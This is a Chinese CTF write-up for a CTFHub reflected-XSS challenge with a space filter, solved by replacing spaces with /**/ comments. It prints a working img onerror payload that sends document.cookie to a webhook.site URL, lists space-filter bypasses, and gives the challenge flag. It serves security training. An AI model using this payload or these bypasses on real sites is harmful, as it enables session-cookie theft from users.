---
title: CTFHub XSS 过滤空格
date: 2026-10-03
categories: CTFHub Web
tags: CTFHub Web XSS OOB
---
# 题目: CTFHub XSS 过滤空格

## 题目描述
页面存在输入点，输入内容会直接反射输出到页面。后端会过滤并删除所有空格字符。平台提供 Send URL to Bot 功能，Flag存放在Bot的Cookie中，需要构造不含空格的XSS Payload，执行JS读取Bot Cookie，通过OOB外带获取flag。
 
## 解题思路
1. 先测试普通带空格的XSS语句，发现空格被后端清除，JS语法被破坏，无法执行。
2. 寻找空格替代字符，使用JS注释 /**/ 代替空格，WAF只过滤空格，不会删除注释内容。
3. 构造无空格Payload，使用 img 标签的 onerror 事件触发JS，利用 new Image() 发起GET请求，把Cookie拼接到URL参数，外带到webhook.site接收平台。
4. 将构造好的恶意链接提交给Bot，监听webhook请求记录，从请求参数中提取Cookie，拿到flag。
 
## 解题步骤
1. 漏洞测试
输入带空格的测试payload：
<script> alert(1)</script>
后端删除空格，代码语法损坏，无法弹窗，确认存在空格过滤。
 
2. 构造绕过空格的Payload
使用 /**/ 替代空格，最终Payload：
<img/**/src=x/**/onerror="new/**/Image().src='https://webhook.site/53595844-8e14-4c3f-89b4-bffe6625e4e2?c='+document.cookie">

3. 提交Payload，发送给Bot
将Payload粘贴到靶场输入框，点击Submit提交；复制浏览器地址栏完整URL，粘贴到 Send URL to Bot 输入框，点击Send。

4. 获取Flag
刷新webhook.site页面，等待Bot发送请求，查看 Query strings 查询参数，获取Bot的Cookie，提取flag：
ctfhub{db6883d67486b271d8b9cbec}

## 踩坑指南
1. 不能直接使用空格，后端会删除空格，JS代码断裂，Payload失效。
2. /**/ 注释充当空格，注释内部不能添加空格，否则会被过滤。
3. 部分场景会过滤 <script> 标签，优先使用 img+onerror 事件绕过，不需要script标签。
4. webhook.site是境外网站，Bot可能访问超时，备选可以使用DNSlog、shturl.。
5. 不推荐 location.href 跳转方式，页面跳转容易中断JS执行，导致外带失败。
 
## 知识点总结
1. XSS空格过滤：后端使用正则匹配删除空格字符，破坏JS代码语法，阻止XSS执行。
2 .空格绕过手段： /**/ JS注释（最常用）、 %09 制表符、 %0a 换行符、 %0d 回车符，都可以充当空白分隔符。
3. 事件型XSS： onerror 、 onload 等标签事件，可以不依靠 <script> 标签执行JS代码。
4. OOB外带：利用img标签GET请求无CORS跨域限制，将Cookie等敏感数据发送到自己控制的第三方日志平台。
